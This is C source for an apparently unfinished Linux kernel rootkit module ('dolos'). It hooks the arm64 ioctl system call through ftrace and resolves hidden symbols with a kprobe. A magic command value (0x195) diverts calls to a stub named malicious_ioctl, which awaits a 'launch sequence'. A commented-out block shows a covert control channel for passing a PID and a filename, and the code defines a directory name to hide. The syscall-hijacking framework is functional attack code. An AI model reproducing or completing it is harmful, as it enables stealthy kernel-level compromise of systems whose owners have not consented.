#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
// #include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <asm/cacheflush.h>
#include <linux/module.h>
#include <linux/fprobe.h>
#include <linux/errno.h>
#include <linux/ftrace.h>
#include <linux/delay.h>

MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");

#ifndef DEBUG
#define DEBUG 1
#endif
/* A simple debug print macro that will be compiled out if not defined */
  /* https://stackoverflow.com/questions/1644868/define-macro-for-debug-printing-in-c */
#define debug_print(fmt, args...)\
    do { if (DEBUG) pr_warn(fmt, ##args); } while(0)


typedef asmlinkage long (*orig_syscall_t)(const struct pt_regs *);

orig_syscall_t orig_ioctl;

const char *HIDE_DIR = "dolos";

struct ftrace_hook {
    const char *name;
    void * function;
    void * original;
    struct ftrace_ops ops;
};

#define HOOK(_name, _function, _original)   \
    {                                       \
        .name = (_name),                    \
        .function = (_function),             \
        .original = (_original),             \
    }

static void notrace dolos_ftrace_stub(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct ftrace_regs *fregs)
/* When an ftraced function gets called, this is our generic handler. It will call our version of the hooked function */
{	
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook * fhook = op->private;
    /* Since we will call the original function again we need to make sure we don't end up in a loop
     * Check to see if our module is the caller of the original. If yes, don't change PC
     */
    if (!within_module(parent_ip, THIS_MODULE))
    {
        regs->pc = (unsigned long) fhook->function;
    }
}


static void malicious_ioctl(unsigned long arg);


/* set registers & determine hook*/
static asmlinkage long dolos_ioctl(struct pt_regs *regs)
{
    /* ioctl(unsigned int fd, unsigned int cmd, unsigned long arg) */
    int ret = 0;
    unsigned int fd = regs->regs[0];
    unsigned int cmd = regs->regs[1];
    unsigned long arg = regs->regs[2];

    /*
        if (fd == -1877) { // Our creators are talking to us
                if (cmd == 8008) { // pid
                        PID = arg;
                        return 42;

                } else if (cmd == 1234) {
                        FILENAME = kzalloc(FILENAME, sizeof(((char *)arg));
                        copy_from_user(FILENAME, (char *)arg, sizeof(((char*)arg)));
                        return 42;

                } else { // CWEs ASSEMBLE
                        GOTIME = true;
                        return 42;
                }
        } */

    // FIXME: edit conditional to be contingent on GOTIME as well
    if (cmd == 0x195) {
        // debug_print("cmd equals 0x195.\nExecute malicious ioctl here...\n");
	malicious_ioctl(arg);

    } else {
        // pass to original function
        // debug_print("cmd does not equal 0x195.\nPass to original ioctl function...\n");
        ret = orig_ioctl(regs);
    }
    return ret;

}


static void malicious_ioctl(unsigned long arg)
{

        debug_print("\n\nmalicious_ioctl function called.\n\n");
        // FIXME: drop in our launch sequence implementation

}


struct ftrace_ops ops = {
    .func = dolos_ftrace_stub,
    .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY
};

static unsigned long lookup_name(const char *name)
{
    /* kallsyms_lookup_name was a function that used to be exported.
     * See discussion here for why is was removed https://lwn.net/Articles/813350/
     * Now we can use a kprobe to find the address of "any" symbol
     * https://docs.kernel.org/trace/kprobes.html
     */
    struct kprobe kp = {
        .symbol_name = name
    };
    unsigned long addr;
    if (register_kprobe(&kp) < 0) return 0;
    addr = (unsigned long) kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

static int install_hook(struct ftrace_hook* hook)
{
    int ret = 0;
    /* lookup the original symbol */
    unsigned long address = lookup_name(hook->name);
    /* save it to the hook struct */
    *(unsigned long *) hook->original = address;

    debug_print("hook address at %lx\n", address);
    if (address == 0)
    {
        debug_print("Failed to find symbol %s\n", hook->name);
        ret = 1;
        return ret;
    }
    hook->ops.func = dolos_ftrace_stub;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
    hook->ops.private = hook;

    ret = ftrace_set_filter_ip(&hook->ops, address, 0, 0);
    if (ret) {
        debug_print("ftrace_set_filter_ip failed: %d\n", ret);
        return ret;
    }
    ret = register_ftrace_function(&hook->ops);
    if (ret) {
        debug_print("register_ftrace_function %d\n", ret);
        ftrace_set_filter_ip(&hook->ops, address, 1, 0);
    }
    return ret;
}

static void remove_hook(struct ftrace_hook* hook)
{
    int ret;
    ret = unregister_ftrace_function(&hook->ops);
    if (ret) {
        debug_print("unregister_ftrace_function failed: %d\n", ret);
    }
    ret = ftrace_set_filter_ip(&hook->ops, *((unsigned long *) hook->original), 1, 0);
    if (ret) {
        debug_print("ftrace_set_filter_ip failed: %d\n", ret);
    }
}

static int install_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;
    int ret = 0;

    for (i = 0; i < count; i++) {
        ret = install_hook(&hooks[i]);
        if (ret)
        {
            goto error;
        }
    }

    return 0;
error:
    while (i!=0) {
        remove_hook(&hooks[--i]);
    }
    return ret;
}

static void remove_hooks(struct ftrace_hook * hooks, size_t count)
{
    size_t i;
    for (i = 0; i < count; i++)
    {
        remove_hook(&hooks[i]);
    }
}


/* an array of functions we want to hook */
static struct ftrace_hook hooks[] = {
    HOOK("__arm64_sys_ioctl", dolos_ioctl, &orig_ioctl),

};


static int __init dolos_init(void)
/* called on module load */
{
    int ret = 0;
    ret = install_hooks(hooks, ARRAY_SIZE(hooks));
    if (ret) {
        debug_print("failed to load: %d\n", ret);
        return ret;
    }
    debug_print("Loaded\n");

    return 0;
}

static void __exit dolos_exit(void)
/* called on module exit */
{
    int err;
    err = 0;
    remove_hooks(hooks, ARRAY_SIZE(hooks));
    debug_print("unloaded\n");
}

/* register our init and exit functions */
module_init(dolos_init);
module_exit(dolos_exit);
